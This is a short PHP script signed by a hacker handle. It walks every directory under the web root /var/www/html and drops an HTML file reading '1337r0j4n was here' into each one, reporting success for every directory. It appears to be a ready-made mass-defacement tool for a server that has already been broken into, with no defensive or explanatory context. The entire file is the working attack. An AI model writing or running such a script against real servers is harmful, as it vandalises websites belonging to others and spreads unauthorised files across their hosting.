<?php

/*

code by 133r0j4n

*/

$baseDir = '/var/www/html';
$fileName = '1337rj4n.html';
$content = '1337r0j4n was here';

function getAllDirs($dir) {
    $dirs = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        if ($item->isDir()) {
            $dirs[] = $item->getPathname();
        }
    }
    return $dirs;
}

function putContentInFiles($baseDir, $fileName, $content) {
    $allDirs = getAllDirs($baseDir);
    foreach ($allDirs as $dir) {
        $filePath = $dir . '/' . $fileName;
        file_put_contents($filePath, $content, LOCK_EX);

        echo "OK '$fileName' @ '$dir'" . PHP_EOL;
    }
}

putContentInFiles($baseDir, $fileName, $content);
